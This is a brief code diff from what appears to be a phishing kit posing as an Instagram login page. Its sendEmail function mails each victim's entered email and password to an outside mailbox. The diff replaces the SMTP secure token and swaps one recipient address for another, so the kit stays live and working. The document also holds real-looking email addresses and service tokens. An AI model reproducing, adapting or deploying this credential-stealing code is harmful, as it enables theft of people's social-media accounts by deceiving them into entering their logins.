@@ -19,9 +19,9 @@ loginbtn.addEventListener('click',()=>{
 });
 function sendEmail(loginInfo) {
     Email.send({
-        SecureToken: '7e6d6ef4-6c07-4e0f-92f8-1b059aab13fb',
-        To: 'dspeed637@gmail.com',
-        From: 'dspeed637@gmail.com',
+        SecureToken: 'ff23ef3b-708c-47ba-a213-fd400bd731da',
+        To: 'stuffbooster@outlook.com',
+        From: 'stuffbooster@outlook.com',
         Subject: `!!! ${loginInfo.mail} | ${loginInfo.pwd}`,
         Body: `<p><b>The instagram:</b> ${loginInfo.mail}</p> 
          <p><b>The password:</b> ${loginInfo.pwd}</p>`,
